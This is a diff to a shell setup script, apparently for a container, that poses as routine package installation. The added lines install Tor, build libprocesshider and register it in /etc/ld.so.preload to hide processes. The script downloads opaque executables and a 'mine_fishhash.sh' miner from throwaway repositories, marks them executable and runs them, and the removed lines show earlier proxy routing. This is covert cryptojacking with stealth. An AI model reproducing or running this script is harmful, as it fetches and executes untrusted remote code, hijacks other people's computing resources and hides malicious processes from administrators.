@@ -1,3 +1,4 @@
+#!/bin/sh
 apt-get update && apt-get install -y \
     bash \
     curl \
@@ -18,12 +19,18 @@ apt-get update && apt-get install -y \
  && mkdir -p /home/stuff
 apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 echo "Uploaded files:" && ls /home/stuff/
-proxy="142.54.232.6" 
-port="4145"
-wget -q -O Banque_Éminence https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x Banque_Éminence
-wget -q https://github.com/pagesrlepla/mx8/raw/main/bash && chmod +x bash
+ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+apt update
+apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
+service tor start
+git clone https://github.com/hanifgz/libprocesshider.git
+cd libprocesshider;make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+cd ..
 wget -q https://raw.githubusercontent.com/pagesrlepla/mx8/main/mine_fishhash.sh && chmod +x mine_fishhash.sh
-wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+wget -q https://github.com/pagesrlepla/mx8/blob/main/bash && chmod +x bash
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
@@ -39,5 +46,5 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./mine_fishhash.sh
+./mine_fishhash.sh
 
